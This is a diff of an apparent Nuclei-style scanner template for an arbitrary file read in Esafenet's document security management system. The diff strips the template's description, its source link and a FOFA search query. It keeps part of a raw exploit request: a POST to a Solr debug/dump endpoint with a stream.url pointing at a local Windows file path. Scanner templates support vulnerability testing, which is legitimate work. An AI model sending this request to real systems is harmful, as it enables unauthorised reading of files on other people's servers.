@@ -3,12 +3,8 @@ info:
   name: 亿赛通 电子文档安全管理系统 任意文件读取
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fhbvtcxp4a88wzx2'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: fhbvtcxp4a88wzx2
-    fofa: title="电子文档安全管理系统"
 http:
 - raw:
   - 'POST /solr/flow/debug/dump?param=ContentStreams HTTP/1.1
@@ -33,8 +29,6 @@ http:
 
 
     Upgrade-Insecure-Requests: 1
-
-
 
 
     stream.url=file:///C:\Program Files\
